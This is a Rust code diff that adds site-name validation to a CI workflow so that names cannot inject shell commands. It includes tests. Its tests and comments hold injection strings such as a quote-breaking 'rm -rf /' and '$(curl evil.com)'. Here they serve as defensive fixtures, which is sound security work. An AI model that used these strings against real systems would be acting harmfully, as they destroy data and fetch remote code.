@@ -121,6 +121,29 @@ impl From<String> for KnownPresent {
     }
 }
 
+/// Upper bound on a site name's length. Names appear in CLI output,
+/// CSV columns, and the validate-sites.yml workflow's run-summary
+/// table — keeping them short avoids both UI breakage and
+/// pathological CI artefacts.
+const NAME_MAX_LEN: usize = 80;
+
+/// True when `name` consists only of characters safe to interpolate
+/// into shell, CSV, and CLI argument contexts. Matches the JSON
+/// Schema pattern `^[\w][\w .()!/+-]*$`.
+fn is_safe_site_name(name: &str) -> bool {
+    let mut chars = name.chars();
+    match chars.next() {
+        Some(c) if c.is_ascii_alphanumeric() || c == '_' => {}
+        _ => return false,
+    }
+    chars.all(|c| {
+        c.is_ascii_alphanumeric()
+            || c == '_'
+            || c == ' '
+            || matches!(c, '.' | '(' | ')' | '!' | '/' | '+' | '-')
+    })
+}
+
 /// A rule for extracting one profile field from a page.
 #[derive(Debug, Clone, Serialize, Deserialize)]
 pub struct Extractor {
@@ -146,6 +169,30 @@ impl Site {
         if self.name.trim().is_empty() {
             return Err(Error::InvalidSite {
                 reason: "site name is empty".into(),
+            });
+        }
+        // Site names doubled as shell-interpolation values in the
+        // `validate-sites.yml` PR gate; an unsanitised name like
+        // `Foo"; rm -rf /; #` would have broken out of `"$name"`
+        // quoting and run arbitrary commands on the runner. Both the
+        // JSON Schema and this Rust loader enforce a safe character
+        // class (word chars plus a few visual punctuation marks) at
+        // every entry point.
+        if self.name.len() > NAME_MAX_LEN {
+            return Err(Error::InvalidSite {
+                reason: format!(
+                    "site name longer than {NAME_MAX_LEN} chars: {:?}",
+                    self.name
+                ),
+            });
+        }
+        if !is_safe_site_name(&self.name) {
+            return Err(Error::InvalidSite {
+                reason: format!(
+                    "site name {:?} contains characters outside the allowed \
+                     set (word chars, space, `.()!/+-`)",
+                    self.name
+                ),
             });
         }
         if self.signals.is_empty() {
@@ -498,6 +545,65 @@ mod tests {
         .validate()
         .unwrap_err();
         assert!(err.to_string().contains("redirect signal"));
+    }
+
+    #[test]
+    fn validate_rejects_shell_metacharacters_in_name() {
+        // The validate-sites.yml workflow used to inject `--only "$name"`
+        // where `$name` came from PR-controlled sites.json. A name like
+        // `Foo"; rm -rf /; #` would have broken out of `"..."` quoting
+        // and executed on the runner. Schema + this loader both enforce
+        // a safe character class; verify a representative selection of
+        // dangerous chars is rejected.
+        for bad in [
+            "Foo\"; rm -rf /; #",
+            "Bar$(curl evil.com)",
+            "Baz`whoami`",
+            "Qux\\nfoo",
+            "back\\slash",
+            "pipe|ish",
+            "semi;colon",
+            "amp&and",
+            "lt<gt>",
+        ] {
+            let mut s = site_with(vec![Signal::StatusFound { codes: vec![200] }]);
+            s.name = bad.into();
+            let err = s.validate().unwrap_err();
+            assert!(
+                err.to_string()
+                    .contains("characters outside the allowed set"),
+                "expected unsafe-name rejection for {bad:?}, got {err}",
+            );
+        }
+    }
+
+    #[test]
+    fn validate_accepts_real_world_site_names() {
+        // Cross-check the validation against names we actually ship.
+        for ok in [
+            "GitHub",
+            "Steam Community (User)",
+            "X / Twitter",
+            "osu!",
+            "Eintracht Frankfurt Forum",
+            "Archive of Our Own",
+            "Career.habr",
+            "fl",
+            "GitLab.com",
+            "Sbazar.cz",
+        ] {
+            let mut s = site_with(vec![Signal::StatusFound { codes: vec![200] }]);
+            s.name = ok.into();
+            assert!(s.validate().is_ok(), "expected {ok:?} to validate");
+        }
+    }
+
+    #[test]
+    fn validate_rejects_overlong_name() {
+        let mut s = site_with(vec![Signal::StatusFound { codes: vec![200] }]);
+        s.name = "A".repeat(100);
+        let err = s.validate().unwrap_err();
+        assert!(err.to_string().contains("longer than"));
     }
 
     #[test]
